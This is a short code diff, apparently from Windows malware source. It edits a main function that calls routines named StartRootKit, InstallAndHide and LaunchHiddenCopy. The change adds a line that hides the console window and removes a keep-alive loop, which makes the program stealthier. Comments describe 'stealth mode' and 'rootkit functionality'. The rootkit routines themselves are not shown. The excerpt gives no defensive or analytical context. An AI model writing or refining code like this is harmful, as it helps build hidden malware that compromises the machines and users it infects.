@@ -90,14 +90,11 @@ void LaunchHiddenCopy() {
 }
 
 int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
     if (IsHiddenInstance()) {
         // Stealth mode - begin rootkit functionality
         StartRootKit();
-        
-        // Keep hidden instance running
-        while (true) {
-            Sleep(10000);
-        }
     } else {
         // First run - install and hide
         InstallAndHide();
